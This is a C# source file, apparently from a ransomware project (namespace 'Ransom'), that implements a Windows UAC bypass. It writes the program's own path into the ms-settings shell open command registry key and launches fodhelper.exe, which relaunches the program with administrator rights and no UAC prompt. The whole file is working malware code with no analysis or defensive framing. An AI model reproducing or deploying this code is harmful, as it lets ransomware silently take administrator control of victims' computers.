using Shared;
using System.Security.Principal;

namespace Ransom
{
    class ElevatePrivs
    {
        private const string REGISTRY_NAME = "DelegateExecute";
        private const string FOD_HELPER = @"C:\Windows\System32\fodhelper.exe";   //This executable contains auto-elevation settings inside (Signed by Microsoft), which means the UAC prompt won't show up.
        private const string REGISTRY_PATH = @"Software\Classes\ms-settings\shell\open\command";
        
        public ElevatePrivs() { }

        public static bool IsRunningAsAdmin()
        {
            try
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new(identity);

                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
        }

        private static void BypassUAC(string path)
        {
            try
            {
                Utility.ModifyRegister(0, REGISTRY_PATH, REGISTRY_NAME, "");
                Utility.ModifyRegister(0, REGISTRY_PATH, "", path);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        public static bool TryGetAdmin()
        {
            if (IsRunningAsAdmin())
                return true;

            try
            {
                BypassUAC($"{Utility.CMD_PATH} /k \"{Settings.CURRENT_PATH}\"");
                Utility.RunCMDCommand(FOD_HELPER);

                Environment.Exit(0);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Environment.Exit(1);
            }

            return false;
        }
    }
}